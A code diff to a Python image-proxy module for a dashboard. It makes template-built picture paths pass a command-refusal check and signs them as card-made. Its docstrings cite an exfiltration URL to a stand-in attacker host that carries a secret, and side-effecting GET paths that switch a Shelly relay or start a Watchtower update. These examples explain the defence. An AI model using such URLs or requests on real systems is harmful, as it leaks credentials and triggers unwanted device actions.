@@ -11,6 +11,7 @@ from __future__ import annotations
 
 import hashlib
 import hmac
+from typing import Any
 from urllib.parse import parse_qs, quote, urlsplit
 
 from ..config import get_settings
@@ -31,7 +32,27 @@ def _signature(url: str, scope: str = "") -> str:
     return hmac.new(_key(), f"{scope}|{url}".encode(), hashlib.sha256).hexdigest()[:32]
 
 
-def reference(link: str | None, base: str = "", *, named: bool = True) -> str:
+def _scope(base: str, made: bool) -> str:
+    """What a path on the connection is signed for: the connection, and whether the card's own text made the path."""
+    return ("made:" if made else "connection:") + base.rstrip("/")
+
+
+def refuse_a_made_path(path: str, adapter: Any = None) -> None:
+    """Raise ``AdapterError`` (``command_refused``) for a picture path a card made that a read of the kind may not ask.
+
+    ⚠️ A picture is fetched by GET with the connection's credentials, for every viewer of the board, again and again. A
+    path the card's text made (a template) goes through the same check as a request of the card: ``GET /relay/0?turn=off``
+    switches a Shelly and ``GET /v1/update`` starts an update run of Watchtower (B2, found in a review of 1.0.2).
+    ``adapter`` is the kind the card reads through; without one, the words that act for every kind still count.
+    """
+    from types import SimpleNamespace
+
+    from ..adapters.rawread import refuse_a_command
+
+    refuse_a_command(adapter if adapter is not None else SimpleNamespace(raw_read_commands=None), path)
+
+
+def reference(link: str | None, base: str = "", *, named: bool = True, adapter: Any = None) -> str:
     """The ``art`` of a row for a picture address the answers named; empty where there is no picture to show.
 
     ``base`` is the address of the connection: a picture that lives underneath it keeps the connection's credentials.
@@ -39,7 +60,8 @@ def reference(link: str | None, base: str = "", *, named: bool = True) -> str:
     ⚠️ ``named`` says the address is one value of the answer, as it stands. An address put together by a card (a template,
     a formula) may only be a path underneath the connection: otherwise ``https://evil.example.com/p.png?d={secret}`` would
     carry any value the card can read to a host of its author, fetched by the server for whoever shows the board
-    (korrektur J1, F3).
+    (korrektur J1, F3). Such a path also has to pass the check of a read of ``adapter`` before it is signed
+    (:func:`refuse_a_made_path`, which raises), and is signed as made, so the image route checks it once more.
     """
     if not link:
         return ""
@@ -51,7 +73,10 @@ def reference(link: str | None, base: str = "", *, named: bool = True) -> str:
         # viewer must not be able to ask for any path of the service (found in the review of KARTEN-2, 25.10.2026).
         if not stays_underneath(text):
             return ""
-        return f"proxy:{CONNECTION}?u={quote(text, safe='')}&s={_signature(text, 'connection:' + base.rstrip('/'))}"
+        if not named:
+            refuse_a_made_path(text, adapter)
+            return f"proxy:{CONNECTION}?u={quote(text, safe='')}&m=1&s={_signature(text, _scope(base, True))}"
+        return f"proxy:{CONNECTION}?u={quote(text, safe='')}&s={_signature(text, _scope(base, False))}"
     if not named:
         return ""
     split = urlsplit(text)
@@ -79,6 +104,14 @@ def connection_path(path: str, base: str) -> str | None:
         return None
     query = parse_qs(path[len(CONNECTION) + 1:])
     found, signature = (query.get("u") or [""])[0], (query.get("s") or [""])[0]
-    if not found or not stays_underneath(found) or not hmac.compare_digest(signature, _signature(found, "connection:" + base.rstrip("/"))):
+    if not found or not stays_underneath(found) or not hmac.compare_digest(signature, _signature(found, _scope(base, made_by_card(path)))):
         return None
     return found
+
+
+def made_by_card(path: str) -> bool:
+    """Whether a ``CONNECTION`` path is one the card's text made, not one the answers named: the image route checks it again.
+
+    The mark is part of what is signed (:func:`_scope`): leaving it out of the address makes the signature not fit.
+    """
+    return path.startswith(CONNECTION + "?") and (parse_qs(path[len(CONNECTION) + 1:]).get("m") or [""])[0] == "1"
